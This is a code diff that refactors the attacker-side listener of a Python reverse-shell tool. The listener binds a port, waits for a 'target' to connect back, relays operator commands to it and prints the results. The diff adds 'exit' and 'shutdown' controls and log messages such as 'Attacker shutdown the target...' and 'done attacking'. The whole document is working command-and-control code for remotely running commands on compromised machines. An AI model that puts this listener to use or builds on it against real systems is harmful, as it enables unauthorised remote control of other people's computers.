@@ -37,9 +37,36 @@ def process_cmd_continue(in_cmd):
 
     return False
 
-def resolve_hp():
-    """Resolve host and port.
+def wait_shell_cmd(path):
+    """Prompt the shell info, and receive command input.
+
+    @param { string } path : Shell path to prompt.
+    @returns { string } in_cmd : Input command.
+    @returns { boolean } iic : Is internal command?
+    @returns { string } rl_cmd : Real command that the internal command
+    prefex is removed.
     """
+    got_input = False
+    while not got_input:
+        # Get input command.
+        in_cmd = input(path + "$ ")
+        rl_cmd = in_cmd
+
+        # Check if is internal command type.
+        iicp = command.is_internal_command_prefix(in_cmd)
+        iic = False
+        if iicp:
+            # Remove prefix, get the internal command.
+            rl_cmd = in_cmd[1:]
+            iic = command.is_internal_command(rl_cmd)
+            if not iic:
+                logger.error(f"'{in_cmd}' is not recognized internal command.")
+                continue
+        got_input = True
+    return (in_cmd, iic, rl_cmd)
+
+def __resolve_hp():
+    """Resolve host and port."""
     # Resolve arguments.
     arg_len = len(sys.argv)
 
@@ -48,11 +75,13 @@ def resolve_hp():
     else:
         port = constant.PORT
 
+    return port
+
 
 def main():
     """Program Entry point."""
 
-    host, port = resolve_hp()
+    port = __resolve_hp()
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind(('', port))
@@ -60,7 +89,9 @@ def main():
 
         logger.info(f"Bind port: {port}")
 
-        while True:
+        shutdown = False
+
+        while not shutdown:
             logger.info(f"Waiting target... : {LISTEN_COUNT}")
             conn, addr = s.accept()
             with conn:
@@ -69,32 +100,26 @@ def main():
                     # Receive shell info.
                     path = conn.recv(constant.BUF_SIZE).decode(constant.DECODE_TYPE)
 
-                    # Get input command.
-                    in_cmd = input(path + "$ ")
+                    in_cmd, iic, rl_cmd = wait_shell_cmd(path)
 
-                    # Check if is internal command type.
-                    iic = command.is_internal_command(in_cmd)
-
-                    # Check exit command before sending.
+                    # Check shutdown command before receiving.
                     if iic:
-                        # Remove prefix, get the real command.
-                        in_cmd = in_cmd[1:]
-
-                        if in_cmd == command.Command.EXIT.value:
+                        # NOTE(jenchieh): Check possible command at this moment.
+                        if rl_cmd == command.Command.EXIT.value:
+                            logger.info("Attacker exit the target...")
                             break
-                        else:
-                            logger.error(f"'{in_cmd}' is not recognized internal command.")
 
                     # Send it.
                     conn.sendall(in_cmd.encode(constant.ENCODE_TYPE))
 
                     # Check shutdown command before receiving.
                     if iic:
-                        if in_cmd == command.Command.SHUTDOWN.value:
-                            print("Attacker shutdown the target...")
+                        # NOTE(jenchieh): Check possible command at this moment.
+                        if rl_cmd == command.Command.SHUTDOWN.value:
+                            logger.info("Attacker shutdown the target...")
+                            shutdown = True
                             break
-                        else:
-                            logger.error(f"'{in_cmd}' is not recognized internal command.")
+
 
                     if process_cmd_continue(in_cmd):
                         continue
@@ -103,6 +128,8 @@ def main():
                     outs = conn.recv(constant.BUF_SIZE).decode(constant.DECODE_TYPE)
 
                     print(outs)
+
+    logger.info("Exit program, done attacking.")
 
 if __name__ == "__main__":
     main()
